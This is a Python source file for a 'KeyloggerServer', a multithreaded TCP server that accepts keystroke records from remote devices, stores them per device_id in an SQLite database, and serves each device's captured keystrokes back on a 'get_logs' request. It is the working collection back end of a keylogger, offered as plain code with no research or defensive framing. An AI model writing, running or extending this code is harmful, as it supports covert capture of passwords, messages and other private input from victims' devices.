import socket
import json
import threading
import sqlite3
import logging
from datetime import datetime
import os

logging.basicConfig(level=logging.DEBUG)
logger = logging.getLogger(__name__)

class KeyloggerServer:
    def __init__(self, host='0.0.0.0', port=12345, db_path='data/keylogger.db'):
        self.host = host
        self.port = port
        self.db_path = db_path
        self.running = True
        self.server = None
        
        # Ensure data directory exists
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        
        # Initialize database
        self.init_db()

    def init_db(self):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute('''CREATE TABLE IF NOT EXISTS keystrokes
                        (id INTEGER PRIMARY KEY AUTOINCREMENT,
                         device_id TEXT NOT NULL,
                         timestamp TEXT NOT NULL,
                         content TEXT NOT NULL)''')
            conn.commit()
            conn.close()
            logger.debug("Database initialized successfully")
        except Exception as e:
            logger.error(f"Error initializing database: {e}")
            raise

    def handle_client(self, client_socket, addr):
        try:
            data = client_socket.recv(4096).decode()
            request = json.loads(data)
            logger.debug(f"Received data from {addr}: {request}")
            
            if 'type' in request and request['type'] == 'get_logs':
                # Handle log retrieval request
                device_id = request['device_id']
                logs = self.get_logs(device_id)
                client_socket.send(json.dumps(logs).encode())
            else:
                # Handle keystroke data
                self.save_keystrokes(request)
                client_socket.send('OK'.encode())
                logger.debug(f"Saved keystrokes for device {request.get('device_id')}")
                
        except Exception as e:
            logger.error(f"Error handling client {addr}: {e}")
            client_socket.send(str(e).encode())
        finally:
            client_socket.close()

    def save_keystrokes(self, data):
        try:
            logger.debug(f"Attempting to save keystrokes to {self.db_path}")
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("INSERT INTO keystrokes (device_id, timestamp, content) VALUES (?, ?, ?)",
                     (data['device_id'], data['timestamp'], data['content']))
            conn.commit()
            conn.close()
            logger.debug(f"Successfully saved keystrokes for device {data['device_id']}")
        except Exception as e:
            logger.error(f"Error saving keystrokes: {e}")
            raise

    def get_logs(self, device_id):
        try:
            conn = sqlite3.connect(self.db_path)
            c = conn.cursor()
            c.execute("SELECT content FROM keystrokes WHERE device_id = ? ORDER BY timestamp DESC",
                     (device_id,))
            rows = c.fetchall()
            conn.close()
            return [row[0] for row in rows]
        except Exception as e:
            logger.error(f"Error getting logs: {e}")
            return []

    def start(self):
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            self.server.bind((self.host, self.port))
            self.server.listen(5)
            logger.info(f"Server listening on {self.host}:{self.port}")
            
            while self.running:
                try:
                    client, addr = self.server.accept()
                    logger.debug(f"Accepted connection from {addr}")
                    client_handler = threading.Thread(
                        target=self.handle_client,
                        args=(client, addr)
                    )
                    client_handler.daemon = True
                    client_handler.start()
                except socket.error:
                    if not self.running:
                        break
                    
        except Exception as e:
            logger.error(f"Server error: {e}")
        finally:
            if self.server:
                self.server.close()

    def stop(self):
        self.running = False
        if self.server:
            self.server.close()
        # Create a dummy connection to unblock accept()
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.connect((self.host, self.port))
        except:
            pass

if __name__ == "__main__":
    server = KeyloggerServer()
    server.start() 